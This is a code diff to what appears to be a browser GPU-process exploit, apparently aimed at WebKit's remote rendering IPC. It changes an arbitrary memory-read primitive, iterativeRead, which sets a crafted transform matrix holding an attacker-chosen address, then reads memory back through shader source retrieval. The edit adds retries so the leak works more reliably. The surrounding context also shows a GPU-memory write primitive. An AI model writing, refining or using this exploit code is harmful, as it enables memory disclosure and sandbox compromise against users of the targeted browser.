@@ -7391,17 +7391,26 @@
       return true;
     }
     function iterativeRead(address, size) {
-      if (dirty_read_count++ != 0) {
-        if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex + 1], cache_id, new Uint8Array(0x10), new Uint8Array(0x80), 8, timeout = crash_timeout)) return false;
+      const max_attempts = 4;
+      let last_leak_size = 0;
+      for (let attempt = 0; attempt < max_attempts; attempt++) {
+        if (dirty_read_count++ != 0) {
+          if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex + 1], cache_id, new Uint8Array(0x10), new Uint8Array(0x80), 8, timeout = crash_timeout)) return false;
+        }
+        RemoteDisplayListRecorder_SetCTM(imageBufferIdentifiers[dirtyWriteIndex + 2], size << 32n | 3n, address, 0x0000000049ac480cn, 0n, 0n, 0n);
+        if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 2], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
+        RemoteGraphicsContextGL_Flush();
+        RemoteGraphicsContextGL_Finish();
+        const leak = RemoteGraphicsContextGL_GetShaderSource();
+        if (leak.byteLength == size) {
+          return leak;
+        }
+        last_leak_size = leak.byteLength;
+        LOG(`iterativeRead retry ${attempt + 1}/${max_attempts}: expected ${size}, actual ${leak.byteLength}`);
+        sleep(5);
       }
-      RemoteDisplayListRecorder_SetCTM(imageBufferIdentifiers[dirtyWriteIndex + 2], size << 32n | 3n, address, 0x0000000049ac480cn, 0n, 0n, 0n);
-      if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 2], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
-      const leak = RemoteGraphicsContextGL_GetShaderSource();
-      if (leak.byteLength != size) {
-        crashGPUProcess(`leak size mismatch (expected: ${size}, actual: ${leak.byteLength})`);
-        return false;
-      }
-      return leak;
+      crashGPUProcess(`leak size mismatch (expected: ${size}, actual: ${last_leak_size})`);
+      return false;
     }
     function copy_to_gpu(addr, buffer) {
       ASSERT(addr > 0x100000000n, `copy_to_gpu(): tried to write to ${addr.hex()}`);
